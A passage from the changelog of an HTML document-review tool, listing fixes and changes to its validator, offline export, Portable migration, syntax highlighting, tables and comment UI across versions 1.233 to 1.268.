  `chart_block.py` and the `--strict` and stamping paths of `finalize.py`, `upgrade.py` and
  `validate.py`. An advisory names something the author cannot clear, so it is always reported
  but never blocks a fail-closed tool and never withholds the `commentable-html-validated` stamp.
  Today the set holds exactly one prefix: a code block carrying deliberately hand-written INERT
  markup, which the authoring tools pass through verbatim by design - without this, the scan fix
  above would have made such a document impossible to write back or stamp. Markup that is not
  inert stays FATAL: inertness is decided by a whole-tag allowlist (every `<` must open a
  well-formed inline formatting tag carrying at most a quoted `class`), so a raw `<script>`, an
  `<iframe>`, any `style`/`is`/`data-*`/event attribute, an unquoted attribute, or a stray `<`
  keeps blocking - a `<pre>` body is parsed as markup and that content executes. Text between
  the tags is escaped source and is never inspected, so a code sample that merely mentions
  `onclick=` or `javascript:` is not flagged. The check also fails CLOSED when a raw `<script>`
  or `<!--` opened inside a code block swallows its `</code></pre>`: it reports the unpaired
  `<pre>` rather than silently inspecting nothing. The theme-contrast advisory is deliberately
  not in the advisory set - its near-miss band ships a concrete `--suggest` fix, so it is
  clearable and still fails `--strict`; `retrofit.py` keeps its own long-standing carve-out for
  it, and now fails closed (every warning fatal) if the validator cannot be imported.
  `upgrade.py --strict` likewise aborts instead of committing when the validator is unavailable,
  and `deck_validate.py --strict` - the command the skill tells deck authors to finish with -
  shares the same contract, so an advisory-only deck no longer exits 1.

## [1.268.0] - 2026-07-29

### Fixed

- An Offline export no longer inlines Chart.js for a document that never calls it. The exporter
  decided by SHAPE - any `figure.chart canvas` or `canvas.cmh-chart` - but a canvas carrying
  `data-cmh-chart-points` / `data-cmh-chart-source` is drawn by the runtime's own 2D renderer and
  never touches Chart.js, so a report whose charts are all built-in shipped roughly a megabyte of
  dead library in every offline file (and, with no diagram either, the vendored payload with it).
  The decision is now made on EVIDENCE: the library travels only when the document has a chart
  canvas the built-in renderer will not draw, or a surviving script that mentions the `Chart`
  global. The superset selector stays load-bearing - an author who attaches their own Chart.js to
  any canvas, including one that also carries the built-in attributes, still gets the library
  inlined, and the evidence match is deliberately loose (it covers indirect construction such as
  `const C = window.Chart; new C(...)` and every executable script MIME type) because a false
  positive only costs bytes while a false negative would ship a chart that never renders.
- An offline re-export can no longer accumulate a second copy of an inlined library. The libraries
  the exporter injects now carry a marker it removes them by, instead of being recognized by their
  own bundled text. A script that merely names a bundle file (in a comment, say) but uses the
  `Chart` global is also no longer removed as if it were a loader shim, and a chart script placed in
  the document head is moved below the inlined library so it cannot run before it.

## [1.265.0] - 2026-07-28

### Added

- `tools/authoring/to_portable.py` migrates an existing NonPortable document into a
  self-contained Portable one, preserving its authored content, its embedded comments, and its
  handled ids - the point of migrating rather than regenerating is that review state travels
  with the document. It is the counterpart to `upgrade.py`, which deliberately refuses a
  NonPortable file. Running it twice is a no-op, and a file that is not a commentable-html
  document is refused rather than rewritten.

### Changed

- Portable is now the ONLY mode generated, by every creation route. `new_document.py` follows the
  resolved TEMPLATE rather than a flag, so the two can never disagree: the default is
  `dist/PORTABLE.html`, and a caller that genuinely needs a legacy NonPortable document asks for
  it explicitly with `--template <dist>/NONPORTABLE.html`, which still gets the full
  companion-reference handling. `retrofit.py` also produces a Portable document by default; a
  legacy one now requires an explicit `--nonportable` or one of the companion-href options.
  `--nonportable` on `new_document.py` is accepted but ignored, and `--portable` on either tool
  now simply names the default, so existing callers keep working.
- NonPortable documents are opened, validated and finalized PERMANENTLY, with no deprecation
  deadline. The NonPortable runtime and its companions (`NONPORTABLE.html`,
  `commentable-html.{css,js,assets.js}`) stay shipped for exactly that reason: existing
  documents reference them by bare name and would break on the next auto-update if they were
  dropped. Only CREATING a new NonPortable document by default has gone away.

### Security

- `to_portable.py` neutralizes any raw-text terminator in the companion bytes it inlines, so a
  stylesheet supplied through `--dist` can no longer close its `<style>` element and have the
  rest parse as live markup - control of a stylesheet used to escalate to arbitrary script
  execution in a document holding authored content and reviewer comments. The payload is
  escaped, never silently dropped.
- The migration writes through a staged temp file swapped in with `os.replace` (the crash-safe
  helper `content_replace.py` already used, now shared as `_atomic_io.py`). The destination used
  to be truncated before the replacement bytes existed, so an interrupted or failing write
  destroyed the document being migrated - reproduced as a 1.4 MB file reduced to zero bytes.
- The CONTENT region that decides which companion reference is the real one is now located from
  line-anchored HTML-comment markers and required to be unique, so reviewer text quoting the
  marker can no longer invert the region and send the stylesheet into the author's markup; an
  ambiguous document is refused rather than guessed at. The mode transition parses the layer
  descriptor as JSON and requires exactly one nonportable-to-portable transition, so a
  reformatted descriptor can no longer be reported as migrated while still marked nonportable.
- Every anchor is resolved against the document's original bytes and applied in one pass of
  non-overlapping edits, and elements are matched in a view with HTML comments and raw-text
  bodies blanked. Untrusted companion text can no longer aim a later step, and a commented-out
  or quoted copy of a companion reference or of the layer descriptor is never the one rewritten.
  A companion is matched by the BASENAME of the URL its element points at, so the absolute
  `file://` references the CLI produced by default, the `--assets-relative` / `--copy-assets` /
  `--assets-href` prefixes and `?v=` cache-busters all migrate rather than being refused; CRLF
  documents migrate too. Migration finally refuses to write a result that would still reference
  a companion, so it can never report success on a document that is not self-contained.

## [1.264.0] - 2026-07-28

### Fixed

- A wide table no longer breaks words mid-token. Table cells used `overflow-wrap: anywhere`,
  which participates in intrinsic (min-content) sizing, so every cell reported a min-content
  width of roughly one character and the table layout algorithm collapsed a column to that and
  shredded its text even while other columns still had spare room - a 14-column table rendered
  `NAMESPACE MOVE` as `NAMES` / `PACE` / `MOVE`. Cells now use `overflow-wrap: break-word`,
  which breaks identically once a line is being laid out but is ignored for min-content, so a
  cell keeps its longest-word width and is only broken when there is genuinely nowhere left to
  go.
- A table that is genuinely too wide for the page now scrolls horizontally inside its own box
  instead of pushing the whole document sideways. This is the other half of the fix above:
  `break-word` is ignored for min-content sizing, which is exactly what stops a column being
  shredded, but it also means a table whose columns cannot fit reports a min-content width
  larger than its container and escapes it. Every table is therefore rendered inside a
  `.cmh-table-scroll` box - the containment narrow screens already had, now at every width. The
  wrapper is a real element rather than `display: block; overflow-x: auto` on the table itself,
  because `display: block` wraps the rows in an anonymous table box that shrink-to-fits and
  collapsed a narrow table's columns to their content width (a 2-column table measured 99px
  instead of 400px) - which also means narrow screens no longer suffer that collapse. A wrapper
  that actually scrolls is keyboard-focusable and labelled, so it can be scrolled without a
  mouse, while a table that fits adds no tab stop. A table built at runtime by an author script
  is contained too, and a table inside a flex or grid parent keeps its width and its placement.
  A focused scroll box owns the arrow keys in a deck, so its clipped columns stay reachable by
  keyboard instead of the arrows changing slides. Printing is unaffected: the wrapper reverts to
  `overflow: visible` so a wide table is never clipped out of a PDF.

## [1.262.0] - 2026-07-28

### Changed

- A document now carries the vendored rich-libraries payload (the gzip+base64 mermaid and
  Chart.js bundle the Offline export inlines) only when its content actually uses a diagram or a
  chart, and never in the document head. It used to be stamped into every document
  unconditionally: measured on the shipped examples it is 1,363 KB, 55 to 61 percent of a 2.3 MB
  file, and it sat on line 7 - so a prose-and-code review document paid for a renderer it could
  never call, and any tool that reads the head of a file hit a megabyte-long line immediately. A
  prose report now goes from 2,301 KB to 938 KB (59 percent smaller) and its longest line from
  1,396,078 characters to 631.
- The decision is re-evaluated on every finalize rather than made once when the document is
  created, so a document that GAINS a diagram after the payload was dropped gets it back and its
  Offline export keeps working. A document whose content region cannot be located is left alone
  entirely - never stripped, and never grown.

## [1.261.0] - 2026-07-27

### Changed

- `finalize` now reads the document once, threads it through the phase transforms in memory, and
  writes once. Each phase previously re-read and re-wrote the whole file, so a 1.4 - 2.5 MB document
  paid a read/write pair plus an independent full-document parse per phase - and because
  `content_replace` finalizes on every write-back, the agent edit loop paid that on every iteration.
  The phase order and every transform are unchanged, so the output is byte-identical. The per-phase
  entry points are REMOVED rather than kept: nothing called them once the pipeline threaded the
  document in memory, and leaving them would let a caller silently reintroduce the per-phase I/O
  this removes.
- Validation and the validated provenance stamp now work on that same in-memory document, so a
  clean `finalize --strict` run costs one read and one write end to end, instead of re-reading the
  file to validate it and then re-reading and re-writing it to stamp it. `validate.validate()`
  takes an optional `html=` argument for callers that already hold the document.

### Fixed

- A quadratic scan in the KQL tokenizer. Deciding whether an identifier was a function call sliced
  the entire remaining query on every token, so cost grew with the square of the query length. It is
  now a bounded lookahead. A newline before the paren still does not make a call, so highlighted
  output is unchanged.

## [1.260.0] - 2026-07-27

### Fixed

- A diff labelled `config.xml`, `page.html` or `main.dart` now highlights. `_EXT_LANG` had no entry
  for those extensions, so extension inference resolved to no language and the diff rendered
  monochrome unless the author passed `data-diff-lang` explicitly - even though both highlighters
  fully support them. A guard test now fails when any supported language has an obvious extension the
  table does not map, so the next language cannot ship with the same hole (CMH-HL-13).
- The runtime `sql` family accepts double-quoted strings, matching its author-time config
  (`string_styles` is `sql_single` plus `double`). A double-quoted SQL identifier previously rendered
  as a string when baked and as plain text at runtime. The other dedicated families' string styles are
  now spot-checked against their configs by the same guard (CMH-HL-15).

### Changed

- Runtime keyword lookup is per LANGUAGE rather than one broad bucket shared by 23 languages. The
  `hash` and `c` families shared a single approximate set, which both over-colored (a lowercase
  `true` in Python, `true`/`false`/`null` in R, `bool` in Objective-C) and under-colored (Python's
  capitalized `True`/`False`/`None` never matched the case-sensitive lookup). Measured cost of
  splitting, on the built `commentable-html.js` rather than on the raw keyword text: 9,346 bytes
  (736,669 -> 746,015, about 1.27 percent), against a divergence visible in every Python block. Each
  set is compared to its author-time config by test, so a future drift fails there instead of shipping
  as a block that renders one way baked and another way live (CMH-HL-14).

## [1.259.0] - 2026-07-27

### Fixed

- Editing a KQL query no longer leaves its **Run in Azure Data Explorer** button executing the
  PRE-EDIT query. The query is encoded inside the link's href, so re-highlighting only the code
  left a stale payload behind - silently, since nothing validated it. `refresh_block()` now recovers
  the cluster and database from the existing link and rebuilds both the code and the href, preserving
  the figure frame, caption and cluster copy affordance; the agent edit loop applies it to every KQL
  figure it writes back (CMH-KQL-10).
- The validator classifies a code block through the shared strict scanner instead of probing for the
  `cmh-code-` substring, so a nested, malformed or hand-edited span is reported rather than silently
  accepted as highlighted (CMH-HL-12).

### Changed

- `language-kusto` / `language-kql` blocks are baked by the same document highlight pass as every
  other language rather than being skipped. Only the dispatch and the emission are shared - KQL keeps
  its own tokenizer and `cmh-kql-*` class vocabulary - so output bytes are unchanged, and the agent
  edit loop can now serve KQL blocks like any other code (CMH-KQL-09).

## [1.258.0] - 2026-07-27

### Added

- Content-scoped editing for the agent review loop. `tools/authoring/content_extract.py` prints ONLY
  the fragment between the CONTENT markers - the 0.1 to 1.3 percent of a document an agent actually
  edits - instead of making it read a 1.4 to 2.5 MB file, and hands back de-highlighted SOURCE so the
  agent never has to hand-maintain token spans. A code block the highlight inverse refuses
  (hand-written markup inside a `<pre><code>`) is passed through verbatim, so the loop never stalls on
  the very blocks it exists to repair (CMH-CONTENT-01).
- `tools/authoring/content_replace.py` writes a fragment back as ONE atomic transaction: check, swap,
  re-bake (typography, section cards, highlighting, an existing TOC), strict-validate, re-stamp the
  content-bound validated hash, and optionally mark Copy-all ids handled. Either every step succeeds
  or the original file is left byte-for-byte unchanged with no temporary file surviving - there is no
  half-finished state and no follow-up step to remember. A replacement that changes nothing does not
  touch the file at all (CMH-CONTENT-02).
- A content edit is LOCAL: a section the agent did not touch keeps a byte-identical hash, so its
  Mark-reviewed marker survives, while an edited section hashes differently (CMH-CONTENT-03).
- `tools/authoring/extract_comments.py` prints the embedded comment snapshot as JSON or fenced text
  for the peer-review path, where a returned Portable file carries comments nobody pasted. It reports
  what is baked into the file, never "all current comments" - a reviewer's newer edits can still sit
  in browser `localStorage`, which no command-line tool can read - and it wraps every reviewer note in
  an untrusted-note fence so a downstream agent treats it as data, not instructions (CMH-CONTENT-04).

## [1.257.0] - 2026-07-26

### Added

- Syntax highlighting is now reversible. A new shared highlight core exposes `dehighlight()`, which
  recovers the exact source a highlighted code block was built from, for every language including
  KQL. The inverse is a LEFT inverse over newline-normalized input, because both emitters fold CRLF
  and lone CR to LF; for content already stored highlighted, dehighlight followed by re-highlight is
  byte-identical, so an untouched block never churns bytes. Escaped entities, a literal `</span>`
  inside a string, multi-line tokens (docstrings, block comments, KQL verbatim strings), tabs and
  astral Unicode all survive the round trip (CMH-HL-09).
- The inverse is a strict single-pass scanner, so content the highlighters did not produce is
  REFUSED rather than corrupted: hand-written markup in a code block, a nested or malformed span,
  extra attributes, an unknown token kind, or non-canonical escaping the emitters never write
  (`&quot;`, `&#x3C;`, `&eacute;`, a bare `&`) all return `None` from `dehighlight()`, and
  `classify()` reports `raw` / `highlighted` / `hand-written` so callers can pass such a block
  through untouched. The exact-escaping rule also makes an accidental double application refuse
  instead of silently decoding source that legitimately contains `&amp;`. A repeated-substitution
  loop is deliberately not used - it would peel nested spans from the inside out and hand back
  plausible but corrupted source (CMH-HL-10).

### Changed

- The code highlighter and the KQL highlighter now share one emission point and one newline
  normalizer, so the reversibility guarantee covers every language instead of being reimplemented
  per tokenizer. The two tokenizers stay separate (their grammars genuinely differ) and both the
  `cmh-code-*` and `cmh-kql-*` class vocabularies are retained, so output bytes are unchanged and
  already-generated documents keep rendering exactly as before. Emitter output is now asserted flat,
  pinning the property the inverse depends on (CMH-HL-11).

## [1.256.0] - 2026-07-27

### Fixed

- The runtime tokenizer now gives every language family that has its own comment/string patterns its
  own KEYWORD set, mirroring the author-time list in `tools/blocks/highlight_code.py`. Those
  families used to fall back to one broad, general-purpose keyword set, which both under-colored and
  over-colored them: an unbaked `language-sql` block rendered `SELECT`, `INSERT`, `JOIN`, `GROUP`
  and `ORDER` as plain text (only the handful of words that happen to exist for other languages,
  like `FROM` and `WHERE`, were colored) while the same block baked at author time colored them all,
  and `css`, `batch`, `powershell`, `haskell` and `lua` had the same gap - `auto`/`inherit`,
  `echo`/`setlocal`, `param`/`begin`, `data`/`instance` and `local`/`end` were all plain. The shared
  set also tinted words the author-time tool never treats as keywords in those languages (`class` in
  Lua, `def` in Haskell). XML is now its own family instead of riding along with HTML, which used to
  color `<div>` and an uppercase `<ROOT>` in an XML block that the baked output leaves plain, and
  three stale words (`deriving`, `newtype`, `none`) left over from before Haskell and CSS had their
  own sets no longer mis-color identifiers in every other language. CSS now matches keywords
  case-insensitively at runtime too, as the author-time tool already did. The broad shared set is
  otherwise unchanged, so a SQL-only word like `insert` still stays a plain identifier in C, Python
  and everything else.

## [1.255.0] - 2026-07-26

### Fixed

- The authoring validator's single-pass script scanner now models REGEX LITERALS. A `/.../` literal
  containing a backtick, a single quote, or a double quote used to flip the scanner into a phantom
  string/template state that blanked the rest of the script, hiding real code from every check that
  reads it - a Markdown fence regex holding a backtick made the shipped showcase deck fail with
  "a `<canvas>` is present but no renderer was found" because the chart's `.getContext(` had been
  blanked. A `/` inside a `[...]` character class no longer ends the literal, escapes are honored,
  and division is told apart from a literal by the usual prev-significant-token heuristic (ambiguity
  and an unterminated literal both resolve to division, so the scanner never blanks live code). A
  `new Chart(` that appears only inside a regex is correctly not counted as executable init.
  (CMH-VAL-17)

### Changed

- The Markdown fence regex in the runtime highlighter spells its backtick literally again; the
  `\x60` workaround that the old scanner limitation forced is no longer needed.
### Added

- A fenced code block inside a Markdown block is now highlighted in its OWN language instead of being
  colored as one flat run: the first word of the fence info string selects the language (aliases
  resolved, so a `py` label and a `python title="x.py"` label both select Python), and an unknown or
  absent label keeps the previous opaque body. The body is highlighted as a whole, so a multi-line
  construct inside it (a block comment, a triple-quoted string) reads exactly as it would in a
  standalone block of that language. A `markdown`-labelled body re-reads as Markdown up to a small
  depth bound and stays opaque past it, so a hostile document cannot drive unbounded recursion.
  (CMH-HL-07, CMH-HL-08)
- The author-time highlighter now knows the common short labels `js`, `jsx`, `mjs`, `py`, `ts` and
  `tsx`. They were runtime-only, so a `js`-labelled block was highlighted by the runtime but baked as
  plain text - and, with nested fences, would have nested on one path and stayed flat on the other. A
  second drift guard now fails in that direction too, so the author-time and runtime label sets
  cannot diverge again. (CMH-HL-03)

## [1.254.0] - 2026-07-26

### Changed

- Editing a comment note now happens INLINE, where the reviewer already is, instead of jumping them
  somewhere else. The sidebar card's `edit` action opens an editor inside that card (exactly like a
  reply), so the document is no longer scrolled to the anchor and no floating composer opens.
  (CMH-THREAD-10)
- `Edit` in the inline comment dialog (opened from the orange "Open comment" hover bubble) turns that
  dialog into an editor in place, so the note is edited right where the reader clicked. While it is
  being edited the dialog stays open (an outside click or the anchor scrolling away no longer discards
  the draft), Escape cancels back to the note view, and a second Escape closes it. (CMH-CORE-16)
- The orange "Open comment" hover bubble is bigger (28px with a 16px glyph), so it is an easier click
  target. (CMH-UI-12)

### Fixed

- Clicking inside an inline reply or note editor no longer also fires the comment card's
  jump-to-anchor, which scrolled the document away mid-edit. (CMH-THREAD-10)
- A comment is now editable in exactly one place at a time: opening a second editor for a note that
  already has an unsaved draft elsewhere (the panel card, the in-document dialog, another highlight's
  dialog, or the floating composer reached by re-selecting the text) hands the reader back to the
  draft instead of duplicating it - previously two editors could exist and the last save silently
  overwrote the other. (CMH-CORE-16)

## [1.253.0] - 2026-07-26

### Added

- A fenced code block inside a Markdown block is now highlighted in its OWN language instead of being
  colored as one flat run: the first word of the fence info string selects the language (aliases
  resolved, so a `py` label and a `python title="x.py"` label both select Python), and an unknown or
  absent label keeps the previous opaque body. The body is highlighted as a whole, so a multi-line
  construct inside it (a block comment, a triple-quoted string) reads exactly as it would in a
  standalone block of that language. A `markdown`-labelled body re-reads as Markdown up to a small
  depth bound and stays opaque past it, so a hostile document cannot drive unbounded recursion.
  (CMH-HL-07, CMH-HL-08)
- The author-time highlighter now knows the common short labels `js`, `jsx`, `mjs`, `py`, `ts` and
  `tsx`. They were runtime-only, so a `js`-labelled block was highlighted by the runtime but baked as
  plain text - and, with nested fences, would have nested on one path and stayed flat on the other. A
  second drift guard now fails in that direction too, so the author-time and runtime label sets
  cannot diverge again. (CMH-HL-03)

## [1.252.0] - 2026-07-26

### Fixed

- The floating `Add Comment` popup no longer jumps to the bottom-right of the following block. A
  whole-line or whole-paragraph selection (a double-click on the trailing word, a triple-click, or a
  drag past the end of the block) is normalized by the browser past the end of that block, so the raw
  range's last client rect covered the ENTIRE next element - a chart figure, an image, a table - and
  the popup landed hundreds of pixels below the selected words. The popup now anchors to the last
  RENDERED character the selection covers, measured rather than guessed from the character class, so
  a preformatted space, a non-breaking space and a narrow no-break space all still anchor it while
  collapsed and zero-width characters do not. It works on both the desktop `mouseup` path and the
  coarse-pointer `selectionchange` (touch) path, and stays clamped to the viewport. (CMH-SEL-03)

## [1.249.0] - 2026-07-26

### Added

- Markdown is now a supported syntax-highlighting language (`markdown`, aliases `md`, `mdown`, `mkd`).
  Markdown carries no keywords, so it gets a dedicated line-oriented tokenizer that reuses the six
  shipped token classes: headings, setext underlines, bold and a fence info string read as keywords;
  emphasis, strikethrough and HTML comments read as comments; inline code spans, fenced-code bodies,
  autolinks and link destinations read as strings; link text, reference labels and footnote references
  read as function names; ordered-list digits read as numbers; and fence delimiters, blockquote markers,
  list bullets, task checkboxes, thematic breaks, table pipes, link brackets and inline HTML tags read
  as punctuation. An intraword underscore (`some_long_name`) never starts emphasis, a backslash-escaped
  marker stays literal, an unterminated marker is left plain, and a fenced body is opaque. (CMH-HL-07)
- The runtime mirrors the same Markdown tokenizer, so an unbaked `language-markdown` block self-heals
  on load and a `.md` / `.markdown` / `.mkd` file in a unified diff is highlighted from its filename.
  (CMH-HL-08)
- The showcase demo report ships a highlighted Markdown block (the volunteer handbook page), and the
  showcase deck's supported-syntax slide lists Markdown. (CMH-DEMO-07)

## [1.248.0] - 2026-07-26

### Fixed

- The floating per-link `Add Comment` button that appears when hovering a commentable link now wears
  the shared crimson accent pill (background, label color, rounded shape, shadow, hover and active
  states) like every other add-comment affordance. `.cm-link-add` had been left out of the shared pill
  rule, so the link button rendered as a plain default browser button. (CMH-UI-04)

## [1.247.0] - 2026-07-26

### Fixed

- A `jsonc` code block is highlighted instead of rendering as plain monochrome text. `jsonc` was not a
  known label on either path - it was missing from the author-time highlighter's alias table and from
  the runtime tokenizer's language map - so a `language-jsonc` block was baked as escaped plain text and
  the runtime fallback declined to touch it. It is now a first-class label that resolves to `json`.
  (CMH-HL-05)
- A `/* ... */` block comment in a JSON/JSONC block is highlighted as a comment. The author-time `json`
  config declared only `//` line comments, so a block comment was tokenized as operators plus plain text
  - and silently disagreed with the runtime, which did treat it as a comment. (CMH-HL-05)
- A comment that directly abuts an operator, with no whitespace between them, is highlighted as a
  comment. The author-time tokenizer's greedy operator run absorbed the comment's opener (`{/*` became
  one operator token), so the comment BODY was then highlighted as live code - which the new JSON block
  comments made visible as `{/* "a": 1 */}` colouring `"a"` as a property key. The operator run is now
  guarded per language by that language's own comment prefixes, so `x=1;/*c*/`, `int x=1;//n`,
  `f x={-c-}`, `$a=1<#c#>` and `x=1--c` all highlight correctly while an operator pair that is not a
  comment in that language (Python floor division `//`) is untouched. (CMH-HL-06)

### Added

- JSON property keys are tinted apart from string values. A double-quoted string whose next
  non-whitespace character is `:` now emits a `cmh-code-key` token instead of `cmh-code-str`, so a JSON
  document reads the way every mainstream JSON highlighter renders it rather than as one wall of green
  strings. The token ships colors for the light theme, the dark theme, deck mode, and the dark-theme
  print re-light, and it is JSON-only - no other language gains a key token. (CMH-HL-05)

### Changed

- The runtime/author-time highlighter drift guard now also requires the runtime to know every author-time
  ALIAS, not just every canonical language. `diffLangKnown()` looks the raw `language-XXX` label up with
  no alias resolution, so an alias-only language was highlightable at author time and monochrome at
  runtime - the exact hole that let `jsonc` ship unhighlighted. (CMH-HL-03)

## [1.246.0] - 2026-07-25

### Fixed

- The shipped example reports and the showcase deck now report the build's release date on the sidebar
  "Generated on" line, stamped by `build.py` from the current version's dated `CHANGELOG.md` heading.
  Previously the date was an authored in-story value that was wrong and out of sync across examples (the
  NYC Taxi report showed `Dec 31, 2014`, the deck showed `Jul 14, 2026`, some reports showed no date at
  all); every example now shows the same, correct build date. (CMH-BUILD-15)
- The sidebar "Generated on" line now renders a date-only value (`YYYY-MM-DD`) as a calendar date in the
  viewer's local time with no time-of-day, so it shows the same day in every timezone. Previously a bare
  date was parsed as UTC midnight and shifted to the previous evening for viewers west of UTC (the
  spurious "..., 02:00" / previous-day display), which would have undercut the release-date stamp above.
  (CMH-SIDE-03)

### Changed

- The sidebar now draws a divider rule above the "Generated on" / "Last comment" metadata block,
  separating it from the Copy all / Export button row and mirroring the header's own rule under the
  "Commenting as" identity line. (CMH-SIDE-03)

## [1.245.0] - 2026-07-25

### Changed

- Deck showcase: the "Act 1 - The loop" slide now illustrates the generate -> review -> comment ->
  copy-all/paste/Enter cycle as a top-down Mermaid diagram that fans out and loops back, so it fills
  the 16:9 stage (full height and width) instead of rendering as one thin, wide band that wasted the
  top and bottom of the slide and clipped its right-most node. (CMH-DECK-41)
- Deck layout: every deck the skill produces now keeps a stable header baseline - the deck CSS reserves
  a consistent title band (em-sized) so a slide's subtitle/body starts at the same height regardless of
  whether the title is one or two lines, and content slides top-align so the title starts at the same
  height on every slide; the header no longer jumps when navigating. Showcase content slides pin that
  header at the top and center the body in the space below it, so a light slide no longer leaves a large
  empty band at the bottom. Section/divider slides still center. (CMH-DECK-42, CMH-DECK-SHOWCASE-12)

## [1.244.0] - 2026-07-25

### Changed

- The identity edit-mode `Save` button is now the crimson primary (matching `Copy all`) and `Cancel`
  a themed secondary button, instead of the browser's default button chrome.
- Moved the `Export` control into the prominent primary row beside `Copy all` and moved `Search` into
  the compact action ribbon, since Export is the more important action. The More menu now anchors to
  its own toggle so it stays clear of the Export button.
- The comment search field is now hidden by default and appears only when the reader opens it with the
  `Search` button (previously it appeared automatically whenever comments existed).

## [1.243.0] - 2026-07-25

### Fixed

- Print / Save-as-PDF single continuous page is now generic across ALL print destinations, not just
  Chromium's native "Save as PDF". Previously it forced the body to the on-screen reading-column width
  (~1280px on a wide screen) and sized a giant custom `@page` to match. Chromium's native vector
  "Save as PDF" honors that custom page, but a driver that ignores it (Microsoft Print to PDF, physical
  printers, browsers without custom-`@page` support) paginated onto standard paper while the body
  stayed forced to ~1280px, so it downscaled to fit (poor quality), left wide side whitespace, and
  stranded tall diagrams. The single page is now sized to a portable standard page (US Letter, 816px)
  and, crucially, the print CSS uses `width: auto` with the inset provided by the `@page` margin
  instead of a forced body width: a browser that honors the custom `@page` fills it as one tall page,
  while any driver that ignores it reflows the content into its OWN real Letter/A4 printable area and
  paginates normally, never downscaled. The height is measured at the exact content width the page
  renders at, so it is accurate (fixing a box-model skew and a double-counted page margin that had
  bloated the page and, on a multi-diagram document, spilled a near-blank overflow page). A document
  with genuinely wide content (a wide table) still grows the page so nothing is clipped.

## [1.242.0] - 2026-07-25

### Changed

- Replaced the two sidebar Sort arrows with a single `Sort` button that cycles document order ->
  newest first -> oldest first -> document order; its icon and tooltip reflect the current state and
  what the next click does.
- Reworded the export "Retain authoring session provenance" checkbox to "Keep AI session id in
  exports" and added a tooltip explaining it (exports strip the AI session/agent id by default).
- Restyled the Export and More dropdown menus as clean, content-width menu items (matching the
  collapsed toolbar menu) instead of full-ribbon-width bordered buttons.
- The author pill now aligns to the note's text bottom so there is no whitespace gap beneath it, and
  the three metadata lines (Generated, Last comment, Commenting as) are evenly spaced.

### Added

- Each export action now shows a centered toast naming which export is running.

## [1.241.0] - 2026-07-25

### Fixed

- Deck: a comments-off (present-only) deck no longer silently re-enables commenting when a review
  NOTE is edited, a CHECKLIST item is toggled, or a widget layout changes. While in the comments-off
  mode a deck no longer auto-opens the sidebar on such a non-comment change (it still does in a
  non-deck document, and in a comments-enabled deck it surfaces the change card); the change is still
  tracked. The deck comment-model observer was also hardened so that neither slide movement nor an
  incidental sidebar open from a non-comment change re-enables commenting - such an incidental open is
  reverted rather than flipping `off` to `open`. Two things still leave `off`: an explicit
  comment-options re-selection, and a real comment actually landing while off (a composer left open
  when off was chosen, then saved) - because `off` is only valid at zero comments, that comment exits
  to `open` so it is not stranded. (CMH-DECK-25, issue #659)

## [1.240.0] - 2026-07-25

### Changed

- Showcase deck polish. Link pills (`.show-link-pill`) keep their rounded pill shape on hover in deck
  comment mode - the authored deck CSS overrides the runtime link-comment hover so the dashed outline
  hugs the pill instead of squaring it (deck-wide, e.g. "View Live Demo" and the install/link pills).
  The primary "View Live Demo" label gains a subtle text-shadow for legibility on the crimson accent,
  and the four slide-9 feature cards lift on hover (translateY + shadow), matching the pill lift.
- Rebalanced the code / notes / decide slides so each uses its space: the "Supported syntax labels"
  card moved onto the "Code, KQL, and diffs" slide, the review checklist moved beside the notes demo,
  and the decision-board slide gained a short widget caption. (CMH-DECK-SHOWCASE-08, CMH-DECK-SHOWCASE-19)

## [1.238.0] - 2026-07-25

### Added

- The showcase deck (`examples/deck-showcase.html`) now demonstrates the full set of user-facing
  areas: a new "Discuss, find, and keep it tidy" slide covers threaded inline replies and colored
  author pills, rich-text comment formatting, per-section review badges plus the section menu and
  search/filter, and the storage manager plus commentable widgets - each framed as a live "Try it"
  invitation, since the deck runs the real runtime. This closes the gap between the deck and the
  documented feature set. (CMH-DECK-SHOWCASE-18)

### Changed

- Governance: the doc-surface registry in `dev/SPEC.md` now tracks a required `Deck` dimension
  alongside the reader-doc surface. Every new user-facing feature must declare that it is demonstrated
  on a showcase-deck slide (`deck`) or record an explicit `opt-out: <reason>`, checked by
  `scripts/check_doc_surfaces.py` (run in the required validate job and the pre-push hook) and encoded
  in AGENTS.md, so the deck stays a fourth documentation surface that cannot silently fall behind.

## [1.237.0] - 2026-07-25

### Changed

- Document links now ALWAYS open in a new tab: the runtime overrides an author-set `target`
  (`_self`/`_top`/a named frame) on a `#commentRoot` document reference (`http`/`https`/`file`) to
  `target="_blank"`, so opening a reference never navigates the reviewer away from the report and
  their comments (CMH-LINK-01). Non-document schemes (`mailto:`/`tel:`/`javascript:`/`data:`),
  same-page `#` fragments, and `.cm-skip` chrome stay excluded.

### Added

- Validator: a warning when an author `<a href>` document reference inside `#commentRoot` sets an
  explicit `target` other than `_blank` (it would open in the same tab), so a same-tab link is
  caught before handoff (CMH-LINK-05).

## [1.236.0] - 2026-07-25

### Changed

- Updated the in-runtime Help/About panel and the guided tutorial (`docs/TUTORIAL.md`) to describe the
  redesigned composite header: the captioned action ribbon (Export, Sort, More, Help, Hide), the
  Copy all / Search split, and the More menu that now holds Manage storage and Clear all comments
  (previously described as living in the Export menu).
- Regenerated every tutorial screenshot that shows the comments panel so it reflects the new header;
  the full-page shots (Copy all, dark theme, saved comment, thread, and others) had lagged behind
  because a whole-page screenshot dilutes the header-region change below the screenshot-check tolerance.

## [1.235.0] - 2026-07-24

### Changed

- Redesigned the comment panel header into a composite layout: a top row with the title, count, and
  the portability badge + version; a captioned action ribbon (Export, Sort, More, Help, Hide); a
  half-and-half Copy / Search row where the Search button reveals and focuses the filter field; and
  stacked Generated / Last comment / identity metadata rows.
- Moved Manage storage and Clear all comments into a new sidebar More menu (kebab); the Export menu
  now holds only the five file formats.

## [1.234.0] - 2026-07-24

### Added

- Rendered mermaid diagrams are now keyboard-commentable, mirroring the image keyboard path: focusing a
  diagram reveals the whole-diagram "Comment on diagram" button and Enter opens the whole-diagram
  composer, so a keyboard-only user never has to tab to the disjointed floating button. Every diagram
  gets exactly one comment tab stop - a standalone host, or the card inside a `.cmh-diagram-gallery`
  (fitting or overflowing, desktop or mobile). A bubbled Enter/Space from a descendant control (a
  `figcaption` link/button) keeps its native action, and on an overflowing gallery card Space and the
  arrow keys are left to native horizontal scrolling (WCAG 2.1.1). (CMH-MMD-11)

## [1.233.0] - 2026-07-24

### Added

- Help/About now documents recently shipped features: a new "Threads, replies and author names" topic
  (set your name via Commenting as, colored author pills, inline Word-style replies, and that Copy all
  and the exports keep each thread together), the storage manager's pie-chart breakdown and
